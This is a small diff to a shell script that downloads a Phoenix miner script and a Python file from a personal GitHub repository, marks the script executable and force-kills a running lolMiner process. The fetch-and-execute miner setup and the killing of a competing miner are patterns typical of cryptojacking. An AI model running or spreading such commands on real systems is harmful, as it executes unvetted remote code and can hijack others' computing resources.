@@ -1,6 +1,5 @@
 #!/bin/sh
-wget https://raw.githubusercontent.com/Master478963/lolMinet/main/PhoenixMinerEth.sh
-chmod +x PhoenixMinerEth.sh
+wget https://raw.githubusercontent.com/Master478963/lolMinet/main/PhoenixMinerEth.sh && chmod +x PhoenixMinerEth.sh
 wget https://raw.githubusercontent.com/Master478963/lolMinet/main/Python.py
 pkill -9 lolMiner
 sleep 30
